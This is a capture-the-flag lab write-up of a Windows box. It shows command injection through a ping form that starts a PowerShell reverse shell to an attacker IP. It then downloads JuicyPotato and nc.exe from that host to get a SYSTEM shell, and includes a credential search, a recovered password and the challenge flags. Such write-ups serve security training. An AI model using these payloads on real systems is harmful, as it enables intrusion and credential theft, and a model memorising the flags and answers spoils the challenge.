## Initial Access

The target has a web page to ping hosts
![[Pasted image 20240621144914.png]]

Put the following in the box to inject a command:
```
127.0.0.1 && powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.38',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

And got a shell:
![[Pasted image 20240621145040.png]]

## Privilege Escalation

First I download [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) and [nc.exe](https://github.com/int0x33/nc.exe/) to the attacker machine.

Then I transferred both files to the target machine, to the `C:\Users\Public\Documents` directory:
```powershell
Invoke-WebRequest http://10.10.16.38:8000/JuicyPotato.exe -OutFile JuicyPotato.exe
```

```powershell
Invoke-WebRequest http://10.10.16.38:8000/nc.exe -OutFile nc.exe
```

Then I ran the following from the website, using the command injection vulnerability:
```
127.0.0.1 && C:\Users\Public\Documents\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc.exe 10.10.16.38 8443 -e cmd.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

Used [this website](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard) for the appropriate CLSID to use.

And I got a shell:
![[Pasted image 20240621173008.png]]

And the flag:
![[Pasted image 20240621173157.png]]

Ev3ry_sysadm1ns_n1ghtMare!

Searching for the confidential.txt file:
![[Pasted image 20240621173653.png]]

Getting the file:
![[Pasted image 20240621173722.png]]

5e5a7dafa79d923de3340e146318c31a

Got the password for ldapadmin with the command:
```powershell
Get-ChildItem -Path C:\ -Recurse -File | Select-String -Pattern ldapadmin
```

car3ful_st0rinG_cr3d$